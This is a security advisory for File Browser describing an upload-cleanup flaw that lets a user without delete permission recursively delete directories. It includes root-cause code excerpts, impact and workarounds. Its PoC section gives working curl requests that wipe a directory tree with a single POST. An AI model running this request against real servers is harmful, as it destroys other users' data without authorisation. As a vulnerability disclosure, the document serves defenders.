# GHSA-c4fr-5f24-4wrj / CVE-2026-90929 — Upload failure-cleanup recursively deletes directories, bypassing Perm.Delete and deny rules

- Severity: high (CVSS 8.1)
- CWEs: CWE-863
- Affected: github.com/filebrowser/filebrowser/v2 >= 2.5.0, <= 2.63.23
- Published: 2026-08-31T06:26:54Z
- URL: https://github.com/filebrowser/filebrowser/security/advisories/GHSA-c4fr-5f24-4wrj

---

## Summary

The direct-upload endpoint removes its target on a failed write, but never rejects a target that is an existing directory. A `POST` with `?override=true` aimed at a directory therefore fails inside `writeFile` — a directory cannot be opened for writing — and the failure cleanup then runs `RemoveAll` on the request path, recursively destroying the whole tree. The cleanup is gated by neither `Perm.Delete` nor the descendant rule walk, so an authenticated user holding only the default Create and Modify permissions can delete directories they are not allowed to delete, including rule-denied files inside them. Reported against v2.63.23 and verified at v2.63.23.

## Details

`resourcePostHandler` in `http/resource.go` authorizes the upload with `Perm.Create` and a rule check on the request path, then resolves the target:

```go
	file, err := files.NewFileInfo(&files.FileOptions{...})
	if err == nil {
		if r.URL.Query().Get("override") != "true" {
			return http.StatusConflict, nil
		}

		// Permission for overwriting the file
		if !d.user.Perm.Modify {
			return http.StatusForbidden, nil
		}
		...
	}
```

`NewFileInfo` succeeds for an existing directory, and unlike `tusPostHandler` — which rejects one explicitly:

```go
		if file != nil {
			if file.IsDir {
				return http.StatusBadRequest, fmt.Errorf("cannot upload to a directory %s", file.RealPath())
			}
```

— this handler has no `file.IsDir` guard. Execution falls through to `writeFile`, whose `OpenFile(dst, os.O_RDWR|os.O_CREATE|os.O_TRUNC, fileMode)` always fails on a directory (`is a directory` on Linux, `Access is denied` on Windows). The failure path then removes the target:

```go
	if err != nil {
		_ = d.user.Fs.RemoveAll(r.URL.Path)
	}
```

`RemoveAll` recurses. Two authorization checks that the delete and patch handlers apply are absent here:

- `Perm.Delete`, enforced by `resourceDeleteHandler`;
- `checkDescendants`, added to `resourceDeleteHandler` and `resourcePatchHandler` for GHSA-77x8-73f4-5485, which walks the subtree and refuses the operation if a rule denies any path inside it.

`ScopedFs.RemoveAll` does call `guard`, so the deletion cannot leave the user's scope — that is the fix for GHSA-fmm7-x4gx-8jhr, and it holds. `guard` proves containment only; it says nothing about the permission bits, the rules, or whether the target is a directory.

The cleanup was introduced in v2.5.0. A later fix, v2.16.0, removed the equivalent cleanup from `resourcePutHandler` but left the one in the upload path.

## PoC

Preconditions: an authenticated non-administrator with `create=true` and `modify=true` — the default preset — and `delete=false`.

```bash
# user "guest": perm.delete=false
JWT=$(curl -s -X POST http://127.0.0.1:8333/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"guest","password":"…"}')

mkdir -p srv/shared/team && echo data > srv/shared/team/plan.txt

# 1) the delete endpoint correctly refuses
curl -o /dev/null -w '%{http_code}\n' -X DELETE \
  http://127.0.0.1:8333/api/resources/shared/team -H "X-Auth: $JWT"
# -> 403

# 2) one upload request wipes the tree
curl -o /dev/null -w '%{http_code}\n' -X POST \
  'http://127.0.0.1:8333/api/resources/shared/team?override=true' \
  -H "X-Auth: $JWT" --data-binary x
# -> 500 ; srv/shared/team and its whole subtree are gone
```

The server log shows the root cause: `POST /shared/team -> 500 … open <root>/shared/team: is a directory`.

The rule variant behaves the same way. With a global rule denying `/important2/secret.txt`, a direct `GET` or `DELETE` of that file returns `403`, but `POST /api/resources/important2?override=true` deletes the entire `important2` tree, the rule-denied file included.

Both results reproduce against the real handlers with the delete-permission and deny-rule negative controls in place: `DELETE /team` returns `403` and `POST /team/sub/secret.txt?override=true` returns `403`, while `POST /team?override=true` returns `500` and removes the tree.

## Impact

An authenticated user with the default Create and Modify permissions can permanently delete any directory inside their scope with a single request, with no trash and no undo.

- **`Perm.Delete` bypass.** Accounts deliberately granted upload-only access — create and modify, without delete — can destroy arbitrary directory trees.
- **Deny-rule bypass.** Files protected by a rule are destroyed along with an allowed parent, the same class of failure as GHSA-77x8-73f4-5485 but through a handler that fix did not cover.
- **Shared scopes.** Where several users share a scope, a restricted account can delete other users' data.

Confidentiality is unaffected: the write is refused and nothing is disclosed.

## Patches

None. The project is no longer maintained and no fix will ship.

## Workarounds

There is no configuration that closes this while leaving uploads usable, because the affected request is an ordinary upload.

- Withhold `Perm.Modify` from accounts that do not need to overwrite files. Without it the override branch returns `403` before reaching `writeFile`, and the cleanup is never reached.
- Where a reverse proxy sits in front of File Browser, reject `POST` requests to `/api/resources/…` carrying `override=true` whose path has no file extension, or restrict them to trusted accounts. This is a heuristic, not a boundary.
- Keep backups. The deletion is immediate and unrecoverable from within File Browser.

## References

- Descendant rule walk that this handler does not use: GHSA-77x8-73f4-5485
- Scope containment on the same cleanup call, fixed and still holding: GHSA-fmm7-x4gx-8jhr
- Directory rejection this handler is missing, as implemented for TUS uploads: `http/tus_handlers.go`
